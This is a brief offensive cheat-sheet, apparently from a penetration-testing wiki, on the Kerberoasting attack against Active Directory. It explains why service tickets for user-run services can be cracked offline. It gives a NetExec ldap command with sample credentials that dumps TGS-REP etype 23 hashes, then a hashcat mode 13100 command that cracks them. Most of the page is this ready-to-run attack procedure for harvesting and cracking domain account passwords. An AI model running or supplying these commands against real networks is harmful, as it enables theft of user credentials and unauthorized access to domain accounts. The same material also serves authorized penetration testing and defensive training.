# Kerberoasting

### You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique

### The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.

## To perform this attack, you need an account on the domain

    nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt

# Cracking with hashcat

     hashcat -m 13100 output.txt wordlist.txt
